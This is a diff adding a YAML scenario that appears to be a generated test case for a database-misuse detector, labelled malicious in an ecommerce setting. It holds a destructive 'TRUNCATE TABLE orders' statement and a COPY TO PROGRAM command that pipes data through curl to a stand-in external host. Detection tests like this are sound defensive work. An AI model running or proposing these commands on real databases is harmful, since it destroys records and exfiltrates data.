@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_55_data_tamper_mal_1571
+family_id: gen_ecommerce_55_data_tamper_mal_fam1571
+domain: ecommerce
+time_of_day: 02:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE orders
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://deid-partner.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.23.1.51
+      port: 9443
